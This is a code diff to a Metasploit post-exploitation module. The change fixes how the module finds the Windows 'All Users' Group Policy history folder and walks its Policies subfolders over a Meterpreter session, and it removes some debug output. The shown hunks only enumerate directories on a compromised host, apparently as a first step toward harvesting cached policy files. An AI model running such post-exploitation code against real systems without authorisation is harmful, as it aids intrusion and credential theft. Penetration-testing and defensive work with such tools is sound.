@@ -72,7 +72,16 @@ class Metasploit3 < Msf::Post
     cached_domain_controller = nil
 
     print_status "Checking for group policy history objects..."
-    all_users = expand_path("%PUBLIC%").gsub('Public', 'All Users')
+    # Windows XP environment variable points to the correct folder.
+    # Windows Vista and upwards points to ProgramData!
+    all_users = expand_path("%ALLUSERSPROFILE%")
+
+    if all_users.include? 'ProgramData' 
+      all_users.gsub!('ProgramData','Users\\All Users')
+    else
+      all_users = "#{all_users}\\Application Data"
+    end
+
     cached = get_basepaths("#{all_users}\\Microsoft\\Group Policy\\History", true)
 
     unless cached.blank?
@@ -179,20 +188,17 @@ class Metasploit3 < Msf::Post
         # Policy\History\{GUID}\Machine\etc without \Policies
         if cached
           locals << "#{base}\\#{sub}\\"
-          puts locals.inspect
-          next
         else
           tpath = "#{base}\\#{sub}\\Policies"
-        end
 
-        begin
-          session.fs.dir.foreach(tpath) do |sub2|
-            next if sub2 =~ /^(\.|\.\.)$/
-            locals << "#{tpath}\\#{sub2}\\"
-            puts locals.inspect
+          begin
+            session.fs.dir.foreach(tpath) do |sub2|
+              next if sub2 =~ /^(\.|\.\.)$/
+              locals << "#{tpath}\\#{sub2}\\"
+            end
+          rescue Rex::Post::Meterpreter::RequestError => e
+            print_error "Could not access #{tpath}  : #{e.message}"
           end
-        rescue Rex::Post::Meterpreter::RequestError => e
-          print_error "Could not access #{tpath}  : #{e.message}"
         end
       end
     rescue Rex::Post::Meterpreter::RequestError => e
